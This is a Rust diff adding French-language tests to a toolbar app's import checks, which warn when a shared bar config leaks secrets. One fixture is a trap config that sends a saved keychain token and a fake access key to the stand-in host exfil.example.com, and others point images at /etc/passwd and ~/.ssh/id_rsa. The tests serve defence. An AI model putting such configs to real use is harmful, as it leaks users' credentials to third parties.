@@ -1076,7 +1076,9 @@ mod tests {
                     for (cle, valeur) in o {
                         match (cle.as_str(), valeur) {
                             ("app", _) if barre_d_app => {}
-                            ("shell" | "applescript" | "app" | "commande", serde_json::Value::String(s)) => trouves.push(s.clone()),
+                            ("shell" | "applescript" | "app" | "commande" | "http", serde_json::Value::String(s)) => trouves.push(s.clone()),
+                            // Un en-tête : sa ligne `Nom: valeur`, montrée telle quelle (trousseau compris).
+                            ("entetes", serde_json::Value::Object(e)) => trouves.extend(e.iter().map(|(n, v)| format!("{n}: {}", v.as_str().unwrap_or_default()))),
                             _ => cherche(valeur, trouves),
                         }
                     }
@@ -1171,5 +1173,89 @@ mod tests {
             }
         }
         std::fs::remove_dir_all(&d).unwrap();
+    }
+
+    /// La barre piège de Karim (revue 0.3, trouvaille 1) : un en-tête `trousseau:` envoie un secret à une adresse tierce.
+    const PIEGE: &[u8] = b"[[element]]\ntype = \"texte\"\nsource = \"x\"\ngabarit = \"{texte}\"\n\n\
+        [[source]]\nnom = \"x\"\nhttp = \"https://exfil.example.com/collecte\"\ntoutes_les = 5\n\
+        entetes = { Authorization = \"Bearer trousseau:github-token\", X-Note = \"ma_cle_en_clair_AKIA1234567890ABCDEF\" }\n";
+
+    fn lignes(barre: &Barre) -> Vec<(String, String, String)> {
+        commandes(barre).into_iter().map(|c| (c.ou.fr, c.quoi.fr, c.valeur)).collect()
+    }
+
+    /// S1 : chaque en-tête est montré, et un `trousseau:` dit quel mot de passe part, et vers où.
+    #[test]
+    fn le_trousseau_envoye_ailleurs_est_montre_et_signale() {
+        let paquet = ouvrir_octets(PIEGE.to_vec(), None).unwrap();
+        let liste: Vec<(String, String, String)> = paquet.commandes.iter().map(|c| (c.ou.fr.clone(), c.quoi.fr.clone(), c.valeur.clone())).collect();
+        let attendu = [
+            ("Source « x »", "Adresse lue toutes les 5 s", "https://exfil.example.com/collecte"),
+            ("Source « x »", "Lit ton mot de passe enregistré « github-token » et l’envoie à exfil.example.com", "Authorization: Bearer trousseau:github-token"),
+            ("Source « x »", "En-tête envoyé à exfil.example.com", "X-Note: ma_cle_en_clair_AKIA1234567890ABCDEF"),
+        ]
+        .map(|(a, b, c)| (a.to_string(), b.to_string(), c.to_string()));
+        assert_eq!(liste, attendu);
+        assert_eq!(paquet.commandes[1].quoi.en, "Reads your saved password “github-token” and sends it to exfil.example.com");
+        // Le résumé de la ligne de commande commence par l'alerte, dans les deux langues.
+        let fichier = Path::new("/tmp/piege.toml");
+        let fr = resume(&paquet, fichier, true);
+        assert_eq!(fr.lines().nth(1), Some("⚠ Attention : cette barre lit ton mot de passe enregistré « github-token » et l’envoie à exfil.example.com. Ne l’importe que si tu as confiance en son auteur."), "{fr}");
+        let en = resume(&paquet, fichier, false);
+        assert_eq!(en.lines().nth(1), Some("⚠ Warning: this bar reads your saved password “github-token” and sends it to exfil.example.com. Only import it if you trust its author."), "{en}");
+        // Vers cette machine : le secret ne sort pas, il est listé sans alerte.
+        let local = ouvrir_octets(b"[[source]]\nnom = \"l\"\nhttp = \"http://127.0.0.1:8080/x\"\nentetes = { A = \"trousseau:moi\" }\n[[element]]\ntype = \"souple\"\n".to_vec(), None).unwrap();
+        assert_eq!(lignes(&local.barre)[1].1, "Lit ton mot de passe enregistré « moi » et l’envoie à 127.0.0.1");
+        assert!(!resume(&local, fichier, true).contains('⚠'));
+        // Un serveur MCP distant aussi reçoit les en-têtes ; deux secrets dans une valeur : deux lignes.
+        let mcp = config::lire("[[source]]\nnom = \"m\"\nmcp = { url = \"https://a:b@mcp.example.org:8443/mcp?x=1\", outil = \"o\" }\nentetes = { A = \"trousseau:un trousseau:deux\" }\n").unwrap();
+        let l = lignes(&mcp);
+        assert_eq!(l[1].1, "Lit ton mot de passe enregistré « un » et l’envoie à mcp.example.org");
+        assert_eq!(l[2].1, "Lit ton mot de passe enregistré « deux » et l’envoie à mcp.example.org");
+    }
+
+    /// S2 : ce qu'une barre lit, exécute ou appelle, pour chaque sorte d'élément, d'action et de source.
+    #[test]
+    fn tout_ce_que_la_barre_fait_est_liste() {
+        let barre = config::lire(
+            "[[element]]\ntype = \"bouton\"\ntexte = \"a\"\nimage = \"/etc/passwd\"\n\n\
+             [[element]]\ntype = \"bouton\"\ntexte = \"b\"\nimage = \"~/.ssh/id_rsa\"\n\n\
+             [[element]]\ntype = \"bouton\"\ntexte = \"c\"\nimage = \"icones/c.png\"\n\n\
+             [[element]]\ntype = \"bouton\"\naction = { url = \"ssh://serveur\" }\n",
+        )
+        .unwrap();
+        let attendu = [
+            ("Barre principale, élément 1 « a »", "Lit un fichier de ton Mac", "/etc/passwd"),
+            ("Barre principale, élément 2 « b »", "Lit un fichier de ton Mac", "~/.ssh/id_rsa"),
+            ("Barre principale, élément 4", "Ouvre l’adresse", "ssh://serveur"),
+        ]
+        .map(|(a, b, c)| (a.to_string(), b.to_string(), c.to_string()));
+        assert_eq!(lignes(&barre), attendu);
+    }
+
+    /// S4 : à l'import, une image hors de la barre importée (`/…`, `~/…`, chemin relatif autre que `icones/`) est
+    /// retirée et dite ; le bouton garde son texte, ou prend un symbole. Une barre locale, elle, garde ses chemins.
+    #[test]
+    fn image_hors_de_la_barre_importee_retiree() {
+        let texte = "[[element]]\ntype = \"bouton\"\ntexte = \"a\"\nimage = \"/etc/passwd\"\n\
+                     [[element]]\ntype = \"bouton\"\nimage = \"~/.ssh/id_rsa\"\n\
+                     [[element]]\ntype = \"groupe\"\n  [[element.element]]\n  type = \"bouton\"\n  symbole = \"star\"\n  image = \"../x.png\"\n";
+        let paquet = ouvrir_octets(texte.as_bytes().to_vec(), None).unwrap();
+        let mut restantes = Vec::new();
+        chaque_image(&mut paquet.barre.clone(), &mut |i| restantes.push(i.clone()));
+        assert!(restantes.is_empty(), "{restantes:?}");
+        match &paquet.barre.elements[..] {
+            [Element::Bouton { texte: Some(t), symbole: None, .. }, Element::Bouton { texte: None, symbole: Some(s), .. }, Element::Groupe { elements, .. }] => {
+                assert_eq!((t.as_str(), s.as_str()), ("a", "photo"));
+                assert!(matches!(&elements[..], [Element::Bouton { symbole: Some(s), image: None, .. }] if s == "star"));
+            }
+            autre => panic!("{autre:?}"),
+        }
+        let avis: Vec<&str> = paquet.avis.iter().map(|a| a.fr.as_str()).collect();
+        assert!(avis.contains(&"image ignorée : chemin hors de la barre importée (/etc/passwd, ~/.ssh/id_rsa, ../x.png)"), "{avis:?}");
+        assert!(paquet.avis.iter().any(|a| a.en == "image ignored: path outside the imported bar (/etc/passwd, ~/.ssh/id_rsa, ../x.png)"));
+        assert!(paquet.commandes.is_empty(), "{:?}", paquet.commandes);
+        // La barre de l'utilisateur, lue par `config`, n'est pas concernée.
+        assert!(matches!(&config::lire(texte).unwrap().elements[0], Element::Bouton { image: Some(i), .. } if i == "/etc/passwd"));
     }
 }
